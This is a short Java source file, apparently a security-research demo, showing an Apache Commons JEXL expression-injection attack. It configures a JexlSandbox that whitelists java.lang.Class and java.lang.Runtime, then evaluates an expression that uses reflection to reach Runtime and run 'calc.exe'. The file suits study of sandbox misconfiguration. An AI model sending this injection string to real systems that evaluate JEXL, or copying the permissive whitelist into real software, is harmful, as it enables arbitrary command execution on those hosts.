package com.sugarp1g.jexlInject;

import org.apache.commons.jexl3.*;
import org.apache.commons.jexl3.introspection.JexlSandbox;

public class Demo {

    public static void main(String[] args) {
        JexlSandbox js = new JexlSandbox(false);
        js.white("java.lang.Integer");
        js.white("java.util.HashMap");
        js.white("java.lang.Class");
        js.white("java.lang.Runtime");
        JexlEngine je = new JexlBuilder().sandbox(js).strict(true).create();
        JexlContext jc = new MapContext();
        String exp = "1.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc.exe\")";
        JexlExpression jex = je.createExpression(exp);
        System.out.println(jex.evaluate(jc));
    }
}
